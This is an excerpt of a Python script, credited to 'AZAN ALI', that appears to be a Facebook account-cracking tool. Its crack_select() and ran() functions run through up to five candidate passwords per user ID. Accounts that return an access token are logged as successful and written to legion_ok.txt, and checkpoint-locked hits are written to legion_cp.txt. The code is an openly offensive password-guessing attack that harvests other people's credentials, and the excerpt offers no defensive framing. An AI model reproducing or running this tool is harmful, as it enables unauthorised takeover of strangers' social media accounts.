...
\033[1;37m========================================================
\033[1;37m[*] \033[1;91m AUTHOR   ➤ \x1b[1;37mAZAN ALI
\033[1;37m[*] \033[1;91m FACEBOOK ➤ \x1b[1;37mAZAN X.
\033[1;37m[*] \033[1;91m GITHUB   ➤ \x1b[1;37mhttps://github.com/MR-AZAN
\033[1;37m========================================================"""
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;92m [AXB-SUCCESFULL] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [AXB-CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;37m [AXB-CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("legion_cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;92m [AXB-SUCCESFULL] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("legion_ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [AXB-CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;92m [AXB-SUCCESFULL] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("legion_ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;37m [AXB-CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("legion_cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;92m [AXB-SUCCESFULL] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("legion_ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;37m [AXB-CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("legion_cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
		...
		try:
			...
			if "access_token" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;92m [AXB-SUCCESFULL] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
...
def ran():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[AXB-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("legion_ok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [AXB-CHECKPOINT] "+k+co+user+" | "+pass1+"\033[0;97m")
					cp = open("legion_cp.txt", "a")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[AXB-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [AXB-CHECKPOINT] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
